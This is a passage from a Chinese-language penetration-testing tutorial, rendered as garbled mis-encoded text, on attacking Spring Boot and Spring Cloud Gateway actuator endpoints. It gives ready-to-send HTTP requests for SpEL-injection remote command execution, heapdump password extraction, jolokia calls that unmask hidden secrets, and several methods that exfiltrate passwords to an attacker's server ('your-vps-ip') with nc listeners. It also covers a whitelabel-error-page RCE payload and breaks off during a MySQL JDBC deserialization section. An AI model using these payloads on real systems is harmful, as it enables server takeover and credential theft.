å…ˆä»‹ç»ä¸€ä¸‹Spring cloud GateWayçš„actuatorç›¸å…³ç«¯ç‚¹

  * è·å–æ‰€æœ‰è·¯ç”±ï¼šGetè¯·æ±‚ï¼šhttp://localhost:xxxx/actuator/gateway/routes/

  * æ·»åŠ è·¯ç”±ï¼šPOSTè¯·æ±‚ï¼šhttp://localhost:xxxx/actuator/gateway/routes/è·¯ç”±ç¼–å·

  * åˆ é™¤è·¯ç”±ï¼šDELETEè¯·æ±‚ï¼šhttp://localhost:xxxx/actuator/gateway/routes/è·¯ç”±ç¼–å·

  * è·å–æŒ‡å®šè·¯ç”±ï¼šGETè¯·æ±‚ï¼šhttp://localhost:xxxx/actuator/gateway/routes/è·¯ç”±ç¼–å·

  * åˆ·æ–°è·¯ç”±ï¼šPOSTè¯·æ±‚ï¼šhttp://localhost:xxxx/actuator/gateway/refresh

å…¶ä¸­ï¼Œè°ƒç”¨æ·»åŠ è·¯ç”±çš„ç«¯ç‚¹æ—¶ï¼Œå¯ä»¥å‘è·¯ç”±ä¸­åŠ å…¥filtersï¼Œè¿‡æ»¤å™¨çš„å€¼å…è®¸ä¸ºspELè¡¨è¾¾å¼ï¼Œä¸”ä¼šè§£æè¿™ä¸ªspELè¡¨è¾¾å¼ã€‚å¯ä»¥é€šè¿‡æ„é€ spELè¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ„é€ çš„filterså¯ä»¥ç›´æ¥åˆ©ç”¨gatewayè‡ªå¸¦çš„AddResponseHeaderï¼Œå°†spELçš„æ‰§è¡Œç»“æœæ·»åŠ åˆ°å“åº”å¤´ä¸­ï¼Œç›´æ¥é€šè¿‡å“åº”å¤´è¿›è¡ŒæŸ¥çœ‹

æ‰€ä»¥æŒ‡çº¹å°±å¾ˆæ¸…æ¥šäº†\--> /actutor/gateway

![]()

 **10.4 exp**  

è¯¥æ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸ºï¼šæ·»åŠ è·¯ç”±-->è§¦å‘payload-->æŸ¥çœ‹ç»“æœ å…¶æœ¬è´¨ä¸ºSpELè¡¨è¾¾å¼æ³¨å…¥ï¼Œåœ¨æ·»åŠ è·¯ç”±æ—¶çš„valueå¤„æ’å…¥è¡¨è¾¾å¼å³å¯10.4.1 æ·»åŠ è·¯ç”±

    
    
    POST /actuator/gateway/routes/milu HTTP/1.1  
    Host:x.x.x.x:8080  
    Accept-Encoding: gzip, deflate  
    Accept: */*  
    Accept-Language: en  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36  
    Connection: close  
    Content-Type: application/json  
    Content-Length: 329  
      
    {  
      "id": "hacktest",  
      "filters": [{  
        "name": "AddResponseHeader",  
        "args": {  
          "name": "Result",  
          "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"  
        }  
      }],  
      "uri": "http://example.com"  
    }
    
    
    alue": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"

è¿™é‡Œé¢çš„idå†™è¦æ‰§è¡Œçš„å‘½ä»¤

è¿™é‡Œfiltersé‡Œçš„nameå¯ä»¥ä»»æ„ä¿®æ”¹ä¸ºä¸‹é¢çš„å†…å®¹

    
    
    #è¿‡æ»¤å™¨ä½¿ç”¨è¯´æ˜  
    https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#the-addrequestheader-gatewayfilter-factory
    
    
    AddRequestHeader  
    MapRequestHeader  
    AddRequestParameter  
    AddResponseHeader  
    ModifyRequestBody  
    DedupeResponseHeader  
    ModifyResponseBody  
    CacheRequestBody  
    PrefixPath  
    PreserveHostHeader  
    RedirectTo  
    RemoveRequestHeader  
    RemoveRequestParameter  
    RemoveResponseHeader  
    RewritePath  
    Retry  
    SetPath  
    SecureHeaders  
    SetRequestHeader  
    SetRequestHostHeader  
    RewriteResponseHeader  
    RewriteLocationResponseHeader  
    SetStatus  
    SaveSession  
    StripPrefix  
    RequestHeaderToRequestUri  
    RequestSize  
    RequestHeaderSize

ä¸¾å‡ ä¸ªä¾‹å­

    
    
    {  
        "id": "first_route",  
        "predicates": [],  
        "filters": [{  
            "name": "Retry",  
            "args":   
                {  
                    "name": "payload",  
                    "value": "123"  
                }  
        }],  
        "uri": "https://www.uri-destination.org",  
        "order": 0  
    }  
    
    
    
    {  
      "id": "first_route",  
      "predicates": [{  
        "name": "Path",  
        "args": {"_genkey_0":"payload"}  
      }],  
      "filters": [],  
      "uri": "https://www.uri-destination.org",  
      "order": 0  
    }  
    
    
    
    {  
        "id": "first_route",  
        "predicates": [],  
        "filters": [{  
            "name": "RedirectTo",  
            "args":   
                {  
                    "status": "302",  
                    "url": "payload"  
                }  
        }],  
        "uri": "https://www.uri-destination.org",  
        "order": 0  
    }  
    
    
    
    {  
        "id": "first_route",  
        "predicates": [{  
            "name": "Cookie",  
            "args": {  
                "name": "payload",  
                "regexp": "ch.p"  
            }  
        }],  
        "filters": [],  
        "uri": "https://www.uri-destination.org",  
        "order": 0  
    }

![]()

10.4.2 è§¦å‘payload

    
    
    POST /actuator/gateway/refresh HTTP/1.1  
    Host: localhost:8080  
    Accept-Encoding: gzip, deflate  
    Accept: */*  
    Accept-Language: en  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36  
    Connection: close  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 0

![]()

10.4.3 æŸ¥çœ‹ç»“æœè®¿é—® --> /actuator/gateway/routes/milu

![]()

  

10.4.4 åˆ é™¤è·¯ç”±

  *   *   *   *   *   *   *   *   *   * 

    
    
    DELETE /actuator/gateway/routes/milu HTTP/1.1Host: 192.168.32.130:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: close  
      
      
    

  

10.4.5 åˆ·æ–°è·¯ç”± **  
**

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POST /actuator/gateway/refresh HTTP/1.1 Host: 192.168.32.130:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0  
      
      
    

 **11.Spring Actuator æœªæˆæƒè®¿é—®**

 **11.1æ¼æ´ä»‹ç»**

Actuator æ˜¯ Spring Boot æä¾›çš„æœåŠ¡ç›‘æ§å’Œç®¡ç†ä¸­é—´ä»¶ã€‚å½“ Spring Boot
åº”ç”¨ç¨‹åºè¿è¡Œæ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨å°†å¤šä¸ªç«¯ç‚¹æ³¨å†Œåˆ°è·¯ç”±è¿›ç¨‹ä¸­ã€‚è€Œç”±äºå¯¹è¿™äº›ç«¯ç‚¹çš„é”™è¯¯é…ç½®ï¼Œå°±æœ‰å¯èƒ½å¯¼è‡´ä¸€äº›ç³»ç»Ÿä¿¡æ¯æ³„éœ²ã€XXEã€ç”šè‡³æ˜¯ RCE ç­‰å®‰å…¨é—®é¢˜ã€‚ **  
**

å…¶å®è¿™ä¸ªä¸Šé¢å·²ç»è¯´è¿‡äº†  

![]()

é‡æ–°è¯´ä¸€ä¸‹å§

 **11.2ç«¯ç‚¹ä»‹ç»**

  

  *   *   *   *   *   *   *   *   *   *   * 

    
    
     /autoconfig  æä¾›äº†ä¸€ä»½è‡ªåŠ¨é…ç½®æŠ¥å‘Šï¼Œè®°å½•å“ªäº›è‡ªåŠ¨é…ç½®æ¡ä»¶é€šè¿‡äº†ï¼Œå“ªäº›æ²¡é€šè¿‡/beans  æè¿°åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡é‡Œå…¨éƒ¨çš„Beanï¼Œä»¥åŠå®ƒä»¬çš„å…³ç³»/env  è·å–å…¨éƒ¨ç¯å¢ƒå±æ€§/configprops  æè¿°é…ç½®å±æ€§(åŒ…å«é»˜è®¤å€¼)å¦‚ä½•æ³¨å…¥Bean/dump  è·å–çº¿ç¨‹æ´»åŠ¨çš„å¿«ç…§/health  æŠ¥å‘Šåº”ç”¨ç¨‹åºçš„å¥åº·æŒ‡æ ‡ï¼Œè¿™äº›å€¼ç”±HealthIndicatorçš„å®ç°ç±»æä¾›/info  è·å–åº”ç”¨ç¨‹åºçš„å®šåˆ¶ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯ç”±infoæ‰“å¤´çš„å±æ€§æä¾›/mappings  æè¿°å…¨éƒ¨çš„URIè·¯å¾„ï¼Œä»¥åŠå®ƒä»¬å’Œæ§åˆ¶å™¨(åŒ…å«Actuatorç«¯ç‚¹)çš„æ˜ å°„å…³ç³»/metrics  æŠ¥å‘Šå„ç§åº”ç”¨ç¨‹åºåº¦é‡ä¿¡æ¯ï¼Œæ¯”å¦‚å†…å­˜ç”¨é‡å’ŒHTTPè¯·æ±‚è®¡æ•°/shutdown  å…³é—­åº”ç”¨ç¨‹åºï¼Œè¦æ±‚endpoints.shutdown.enabledè®¾ç½®ä¸ºtrue/trace  æä¾›åŸºæœ¬çš„HTTPè¯·æ±‚è·Ÿè¸ªä¿¡æ¯(æ—¶é—´æˆ³ã€HTTPå¤´ç­‰)

spring boot 1.xç‰ˆæœ¬ç«¯ç‚¹åœ°å€ --> /health  

spring boot 2.x --> /actuator

 **11.3æ·±å±‚æ¬¡åˆ©ç”¨**  

11.3.1  heapdumpä»‹ç»

Heapdumpï¼Œå³å †è½¬å‚¨æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªJavaè¿›ç¨‹åœ¨æŸä¸ªæ—¶é—´ç‚¹ä¸Šçš„å†…å­˜å¿«ç…§ã€‚HeapDumpè®°å½•äº†JVMä¸­å †å†…å­˜è¿è¡Œçš„æƒ…å†µï¼Œä¿å­˜äº†Javaå¯¹è±¡ã€ç±»ä»¥åŠçº¿ç¨‹æ ˆä»¥åŠæœ¬åœ°å˜é‡ç­‰ä¿¡æ¯ï¼Œæœ€é‡è¦çš„æ˜¯é‡Œé¢å¯èƒ½å­˜æœ‰æ•°æ®åº“å¯†ç ä¿¡æ¯ã€‚

11.3.2å·¥å…· **  
**

    
    
    ä¸‹è½½åœ°å€https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/20230608/heapdump_tool.jar

  

    
    
    java -jar heapdump_tool.jar heapdump

  
æˆ–è€…å¯ä»¥ä½¿ç”¨ä¸€æ¬¾ JVM OQL å¯è§†åŒ–æŸ¥è¯¢å·¥å…· VisualVm å»æŸ¥è¯¢command+å›è½¦è¿è¡Œsqlè¯­å¥è¯´æ˜ï¼šé€‰æ‹©ç¯å¢ƒå˜é‡

    
    
    select * from org.springframework.web.context.support.StandardServletEnvironment

  

![]()

spring boot 1.x ç‰ˆæœ¬ heapdump æŸ¥è¯¢ç»“æœï¼Œæœ€ç»ˆç»“æœå­˜å‚¨åœ¨ java.util.Hashtable$Entry å®ä¾‹çš„é”®å€¼å¯¹ä¸­

  * 

    
    
    â€‚â€‚sql select * from org.springframework.web.context.support.StandardServletEnvironment   â€‚â€‚ select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password")) â€‚

``  
spring boot 2.x ç‰ˆæœ¬ heapdump æŸ¥è¯¢ç»“æœï¼Œæœ€ç»ˆç»“æœå­˜å‚¨åœ¨ java.util.LinkedHashMap$Entry
å®ä¾‹çš„é”®å€¼å¯¹ä¸­ï¼š  

  * 

    
    
    sql select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains("password")) â€‚â€‚

**11.2** **actuator env æ³„éœ²**

 **11.2.1ä»‹ç»**

Spring Boot Actuator æ¨¡å—æä¾›äº†å¥åº·æ£€æŸ¥ï¼Œå®¡è®¡ï¼ŒæŒ‡æ ‡æ”¶é›†ï¼ŒHTTP è·Ÿè¸ªç­‰ï¼Œæ˜¯å¸®åŠ©æˆ‘ä»¬ç›‘æ§å’Œç®¡ç†Spring Boot
åº”ç”¨çš„æ¨¡å—ã€‚è¿™ä¸ªæ¨¡å—é‡‡é›†åº”ç”¨çš„å†…éƒ¨ä¿¡æ¯ï¼Œå±•ç°ç»™å¤–éƒ¨æ¨¡å—ï¼Œå¯ä»¥æŸ¥çœ‹åº”ç”¨é…ç½®çš„è¯¦ç»†ä¿¡æ¯ï¼Œä¾‹å¦‚è‡ªåŠ¨åŒ–é…ç½®ä¿¡æ¯ã€åˆ›å»ºçš„Spring
beansä¿¡æ¯ã€ç³»ç»Ÿç¯å¢ƒå˜é‡çš„é…ç½®ä¿¡æ¯ä»¥åŠWebè¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯ç­‰ã€‚å¦‚æœæ²¡æœ‰æ­£ç¡®ä½¿ç”¨Actuatorï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²ç­‰ä¸¥é‡çš„å®‰å…¨éšæ‚£ï¼ˆå¤–éƒ¨äººå‘˜éæˆæƒè®¿é—®Actuatorç«¯ç‚¹ï¼‰ã€‚å…¶ä¸­heapdumpä½œä¸ºActuatorç»„ä»¶æœ€ä¸ºå±é™©çš„Webç«¯ç‚¹ï¼Œheapdumpå› æœªæˆæƒè®¿é—®è¢«æ¶æ„äººå‘˜è·å–åè¿›è¡Œåˆ†æï¼Œå¯è¿›ä¸€æ­¥è·å–æ•æ„Ÿä¿¡æ¯ã€‚SpringBoot
1.x å’Œ 2.x çš„
Actuatoræ¨¡å—è®¾ç½®æœ‰å·®åˆ«ï¼Œè®¿é—®åŠŸèƒ½çš„è·¯å¾„ä¹Ÿæœ‰å·®åˆ«ï¼Œä½†ç°åœ¨å¤šä½¿ç”¨çš„SpringBootç‰ˆæœ¬ä¸º2.xï¼Œè¿™ç¯‡æ–‡ç« åªè®²SpringBoo 2.x
Actuatoræ¨¡å—å¸¦æ¥çš„ä¿¡æ¯æ³„éœ²ã€‚ **11.2.2æŒ‡çº¹**  

    
    
     eureka  eureka RCE
    
      
    
    
    springt-boot-strater-actuator Snakeyaml RCE  
    
    
    spring-cloud-strater   Snakeyaml RCE
    
    mangodb  æ•°æ®åº“è´¦å·å¯†ç 
    
    mappings   æœªæˆæƒæ¥å£
    
    
    trace  è®¤è¯ä¿¡æ¯ ä¾‹cookie
    
      
    
    
    refresh   getshell
    
    race   æœ€è¿‘è¯·æ±‚ä¿¡æ¯,ä¾‹å¦‚ç™»å½•æƒ…å†µ

h2database h2database query RCE

  

  

envä¸­å¯èƒ½ä¼šå«æœ‰å¾ˆå¤šæ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚å­˜åœ¨ä¸€äº›è„†å¼±èµ„äº§å¦‚redisç­‰

  

![]()

Eureka RCEå¦‚æœenvä¸­èƒ½ç¡®è®¤å­˜åœ¨Eurekaç»„ä»¶ï¼Œé‚£ä¹ˆå¯èƒ½å­˜åœ¨RCEæ¼æ´æ¯”å¦‚ä¸‹é¢è¿™æ · ****

![]()

åé¢æ‰“æ³•å°±ä¸æ¼”ç¤ºäº†

 **12.è·å–æ˜Ÿå·ä¿¡** **æ¯**

 **12.1ä»‹ç»**

 **è®¿é—® /env æ¥å£æ—¶ï¼Œspring actuator ä¼šå°†ä¸€äº›å¸¦æœ‰æ•æ„Ÿå…³é”®è¯(å¦‚ passwordã€secret)çš„å±æ€§åå¯¹åº”çš„å±æ€§å€¼ç”¨ *
å·æ›¿æ¢è¾¾åˆ°è„±æ•çš„æ•ˆæœ**

 **12.2æ–¹æ³•1**  

åˆ©ç”¨æ¡ä»¶

1.ç›®æ ‡ç½‘ç«™å­˜åœ¨ /jolokia æˆ– /actuator/jolokia æ¥å£2.ç›®æ ‡ä½¿ç”¨äº† jolokia-core ä¾èµ–ï¼ˆç‰ˆæœ¬è¦æ±‚æš‚æœªçŸ¥ï¼‰

`Step1`: é¦–å…ˆæˆ‘ä»¬æ‰¾åˆ°æƒ³è¦è·å–çš„å±æ€§åï¼Œè¯·æ±‚ /env æˆ– /actuator/env æ¥å£ï¼Œæœç´¢ *
å…³é”®å­—ï¼Œæ‰¾åˆ°æƒ³è¦è·å–çš„è¢«æ˜Ÿå·æŒ¡ä½çš„å±æ€§å€¼å¯¹åº”çš„å±æ€§å

`Step2`: jolokiaè°ƒç”¨ç›¸å…³Mbeanè·å–æ˜æ–‡ æŠŠä¸‹é¢ç¤ºä¾‹ä¸­çš„ security.user.password
æ›¿æ¢ä¸ºå®é™…ä¸­è¦è·å–çš„å±æ€§åï¼Œå‘åŒ…å³å¯ï¼Œæ˜æ–‡å€¼ä¼šåœ¨responseåŒ…ä¸­çš„ valueä¸­

#### è°ƒç”¨ org.springframeword.boot Mbean

è¯´æ˜ï¼šå®é™…ä¸Šæ˜¯è°ƒç”¨äº†
org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar ç±»å®ä¾‹çš„
getProperty æ–¹æ³•

Spring 1.x

    
    
    POST /jolokia  
    Content-Type: application/json  
      
    {"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}  
    

Spring 2.x

    
    
    POST /actuator/jolokia  
    Content-Type: application/json  
      
    {"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}  
    

#### è°ƒç”¨ org.springframework.cloud.context.environment Mbean

è¯´æ˜ï¼šå®é™…ä¸Šè°ƒç”¨çš„æ˜¯org.springframework.cloud.context.environment.EnvironmentManager
ç±»å®ä¾‹çš„ getProperty æ–¹æ³•

Spring 1.x

    
    
    POST /jolokia  
    Content-Type: application/json  
      
    {"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}  
    

Spring 2.x

    
    
    POST /actuator/jolokia  
    Content-Type: application/json  
      
    {"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]}  
    

### Method-2

åˆ©ç”¨æ¡ä»¶å¦‚â¬‡ï¸ï¼š

  * å¯ä»¥GETè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ /env

  * å¯ä»¥POSTè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ /env

  * å¯ä»¥POSTè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ /refresh æ¥å£åˆ·æ–°é…ç½® ï¼ˆå­˜åœ¨ spring-boot-starter-actuator ä¾èµ–ï¼‰

  * ç›®æ ‡ä½¿ç”¨äº† spring-cloud-starter-netflix-eureka-client ä¾èµ–

  * ç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ˆè¯·æ±‚å¯å‡ºç½‘ï¼‰

`Step-1`: é¦–å…ˆæˆ‘ä»¬æ‰¾åˆ°æƒ³è¦è·å–çš„å±æ€§åï¼Œè¯·æ±‚ /env æˆ– /actuator/env æ¥å£ï¼Œæœç´¢ *
å…³é”®å­—ï¼Œæ‰¾åˆ°æƒ³è¦è·å–çš„è¢«æ˜Ÿå·æŒ¡ä½çš„å±æ€§å€¼å¯¹åº”çš„å±æ€§å

`Step-2`: ä½¿ç”¨ncç›‘å¬HTTPè¯·æ±‚ï¼Œåœ¨è‡ªå·±çš„vpsä¸Šç›‘å¬ 80ç«¯å£

    
    
    nc -lvk 80  
    

`Step-3`: è®¾ç½® eureka.client.serviceUrl.defaultZone å±æ€§ æŠŠ -->
"http://value:${security.user.password}@your-vps-ip" ä¸­çš„
"security.user.password" æ¢æˆè‡ªå·±æƒ³è¦è·å–çš„å¯¹åº”çš„æ˜Ÿå·é®æ©å¯¹åº”çš„å±æ€§åå³å¯

spring 1.x

    
    
    POST /env  
    Content-Type: application/x-www-form-urlencoded  
      
    eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip  
    

spring 2.x

    
    
    POST /actuator/env  
    Content-Type: application/json  
      
    {"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${security.user.password}@your-vps-ip"}  
    

`Step-4`: åˆ·æ–°é…ç½®

spring 1.x

    
    
    POST /refresh  
    Content-Type: application/x-www-form-urlencoded  
      
    

spring 2.x

    
    
    POST /actuator/refresh  
    Content-Type: application/json  
      
    

Step-5:è§£ç å±æ€§å€¼

æ­£å¸¸æ¥çš„è¯ï¼Œncä¼šç›‘å¬åˆ°æœåŠ¡å™¨å‘é€æ¥çš„è¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«ç±»ä¼¼Authorization å¤´å†…å®¹ï¼Œè¿™æ˜¯ä¸€ä¸²base64ï¼Œè§£ç å³å¯

    
    
    Authorization: Basic dmFsdWU6MTIzNDU2  
    

### Method-3

åˆ©ç”¨æ¡ä»¶å¦‚â¬‡ï¸ï¼š

  * é€šè¿‡ POST /env è®¾ç½®å±æ€§è§¦å‘ç›®æ ‡å¯¹å¤–ç½‘æŒ‡å®šåœ°å€å‘èµ·ä»»æ„HTTPè¯·æ±‚

  * ç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ˆå‡ºç½‘ï¼‰

è¯´æ˜ï¼šå‚è€ƒ UUUUnotfound æå‡ºçš„ issue-1ï¼Œå¯ä»¥åœ¨ç›®æ ‡å‘å¤–éƒ¨ http è¯·æ±‚çš„è¿‡ç¨‹ä¸­ï¼Œåœ¨ url path ä¸­åˆ©ç”¨å ä½ç¬¦å¸¦å‡ºæ•°æ®

`Step-1`:**GETè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ /env æˆ– /actuator/envæ¥å£ ï¼Œæœç´¢ * å…³é”®å­—ï¼Œæ‰¾åˆ°æƒ³è¦è·å–çš„è¢«æ˜Ÿå·æŒ¡ä½çš„å±æ€§å€¼å¯¹åº”çš„å±æ€§å

`Step-2`:ç›‘å¬HTTPè¯·æ±‚ åœ¨è‡ªå·±æ§åˆ¶çš„vpsä¸Šç›‘å¬80ç«¯å£

    
    
    nc -lvk 80  
    

`Step-3`: è§¦å‘å¯¹å¤–HTTPè¯·æ±‚

  * spring.cloud.bootstrap.location æ–¹æ³•ï¼ˆåŒæ—¶é€‚ç”¨äºæ˜æ–‡æ•°æ®ä¸­æœ‰ç‰¹æ®Š url å­—ç¬¦çš„æƒ…å†µï¼‰

spring 1.x

    
    
    POST /env  
    Content-Type: application/x-www-form-urlencoded  
      
    spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}  
    

spring 2.x

    
    
    POST /actuator/env  
    Content-Type: application/json  
      
    {"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/?=${security.user.password}"}  
    

  * eureka.client.serviceUrl.defaultZone æ–¹æ³•ï¼ˆä¸é€‚ç”¨äºæ˜æ–‡æ•°æ®ä¸­æœ‰ç‰¹æ®Š url å­—ç¬¦çš„æƒ…å†µï¼‰

spring 1.x

    
    
    POST /env  
    Content-Type: application/x-www-form-urlencoded  
      
    eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}  
    

spring 2.x

    
    
    POST /actuator/env  
    Content-Type: application/json  
      
    {"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/${security.user.password}"}  
    

`Step-4` :åˆ·æ–°é…ç½®

Spring 1.x

    
    
    POST /refresh  
    Content-Type: application/x-www-form-urlencoded  
      
    

Spring 2.x

    
    
    POST /actuator/refresh  
    Content-Type: application/json  
      
    

### Method-4

åˆ©ç”¨æ¡ä»¶å¦‚â¬‡ï¸ï¼š

  * å¯ä»¥æ­£å¸¸GETè¯·æ±‚ç›®æ ‡/headpdump æˆ– /actuator/heapdump

`Step-1`: **GETè¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ /env æˆ– /actuator/envæ¥å£ ï¼Œæœç´¢ * å…³é”®å­—ï¼Œæ‰¾åˆ°æƒ³è¦è·å–çš„è¢«æ˜Ÿå·æŒ¡ä½çš„å±æ€§å€¼å¯¹åº”çš„å±æ€§å

`Step-2`: ä¸‹è½½ jvm heap ä¿¡æ¯ï¼ˆå¤§å°ä¸€èˆ¬åœ¨50M - 500M ä¹‹é—´ï¼Œæœ‰æ—¶å€™ä¼šå¤§äº2Gï¼‰

`Step-3`: ä½¿ç”¨MATè·å– jvm heap ä¸­çš„å¯†ç æ˜æ–‡

å‚è€ƒ æ–‡ç«  æ–¹æ³•ï¼Œä½¿ç”¨ Eclipse Memory Analyzer å·¥å…·çš„ OQL è¯­å¥

    
    
    select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains("password"))  
      
    æˆ–  
      
    select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains("password"))

 **13.whitelabel error page SpEL RCE**

 **13.3.1æ¼æ´ä»‹ç»**

spring boot å¤„ç†å‚æ•°å€¼å‡ºé”™ï¼Œæµç¨‹è¿›å…¥ org.springframework.util.PropertyPlaceholderHelper ç±»ä¸­

æ­¤æ—¶ URL ä¸­çš„å‚æ•°å€¼ä¼šç”¨ parseStringValue æ–¹æ³•è¿›è¡Œé€’å½’è§£æã€‚

å…¶ä¸­ ${} åŒ…å›´çš„å†…å®¹éƒ½ä¼šè¢«
org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration ç±»çš„
resolvePlaceholder æ–¹æ³•å½“ä½œ SpEL è¡¨è¾¾å¼è¢«è§£ææ‰§è¡Œï¼Œé€ æˆ RCE æ¼æ´

 **13.3.2èŒƒå›´** **  
**

spring boot 1.1.0-1.1.12ã€1.2.0-1.2.7ã€1.3.0 è‡³å°‘çŸ¥é“ä¸€ä¸ªè§¦å‘ springboot
é»˜è®¤é”™è¯¯é¡µé¢çš„æ¥å£åŠå‚æ•°å(fuzz)

 **13.3.3æŒ‡çº¹**

Spring Boot ä¼ å‚è§¦å‘é»˜è®¤é”™è¯¯é¡µé¢ --> whitelabel error page SpEL RCE

 **13.3.4  EXP**

![]()

è¿™é‡Œfuzzå‡ºæ¥æ˜¯article?id

![]()

è„šæœ¬ç”Ÿæˆä¸€ä¸‹payload

    
    
    result = ""  
    target = 'å‘½ä»¤'  
    for x in target:  
        result += hex(ord(x)) + ","  
    print(result.rstrip(','))

  *   * 

    
    
    http://192.168.233.131:26875/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{ç”Ÿæˆçš„å­—ç¬¦ä¸²}))}

 **14.mysql jdbc deserialization RCE**

ç¯å¢ƒåœ°å€

SpringBootVulExploit/repository/springboot-mysql-jdbc-rce at master Â·
LandGrey/SpringBootVulExploit Â· GitHub

###  **14.1æ¼æ´åŸç†**

    
    
     1.spring.datasource.url å±æ€§è¢«è®¾ç½®ä¸ºå¤–éƒ¨æ¶æ„ mysql jdbc url åœ°å€  
      
    2.refresh åˆ·æ–°åè®¾ç½®äº†ä¸€ä¸ªæ–°çš„ spring.datasource.url å±æ€§å€¼  
      
    3.å½“ç½‘ç«™è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ç­‰æ“ä½œæ—¶ï¼Œä¼šå°è¯•ä½¿ç”¨æ¶æ„ mysql jdbc url å»ºç«‹æ–°çš„æ•°æ®åº“è¿æ¥  
      
    4.ç„¶åæ¶æ„ mysql server å°±ä¼šåœ¨å»ºç«‹è¿æ¥çš„åˆé€‚é˜¶æ®µè¿”å›ååºåˆ—åŒ– payload æ•°æ®  
      
    5.ç›®æ ‡ä¾èµ–çš„ mysql-connector-java å°±ä¼šååºåˆ—åŒ–è®¾ç½®å¥½çš„ gadgetï¼Œé€ æˆ RCE æ¼æ´

#  **14.2åˆ©ç”¨æ¡ä»¶**  

    
    
     å¯ä»¥ POST è¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ /envæ¥å£è®¾ç½®å±æ€§  
    å¯ä»¥ POST è¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ /refreshæ¥å£åˆ·æ–°é…ç½®ï¼ˆå­˜åœ¨ spring-boot-starter-actuatorä¾èµ–ï¼‰  
    ç›®æ ‡ç¯å¢ƒä¸­å­˜åœ¨ mysql-connector-javaä¾èµ–  
    ç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ˆè¯·æ±‚å¯å‡ºå¤–ç½‘ï¼‰

### åˆ©ç”¨æ–¹æ³•

#### 1ï¼šæŸ¥çœ‹ç¯å¢ƒä¾èµ–

1-GETè¯·æ±‚ /env æˆ– /actuator/envï¼Œæœç´¢ç¯å¢ƒå˜é‡ï¼ˆclasspathï¼‰ä¸­æ˜¯å¦æœ‰ mysql-connector-
javaå…³é”®è¯ï¼Œå¹¶è®°å½•ä¸‹ç‰ˆæœ¬å·ï¼ˆ5.0xæˆ–8.xï¼‰

2-æœç´¢å¹¶è§‚å¯Ÿç¯å¢ƒå˜é‡ä¸­æ˜¯å¦å­˜åœ¨å¸¸è§çš„ååºåˆ—åŒ–gadgetä¾èµ–ï¼Œæ¯”å¦‚ commons-collectionsã€Jdk7u21ã€Jdk8u20ç­‰

æœç´¢ spring.datasource.url å…³é”®å­—ï¼Œè®°å½•ä¸‹valueå€¼ï¼Œæ–¹ä¾¿åç»­æ¢å¤å…¶æ­£å¸¸ jdbc urlçš„å€¼

2ï¼šå‡è®¾æ¶æ„ rogue mysql server

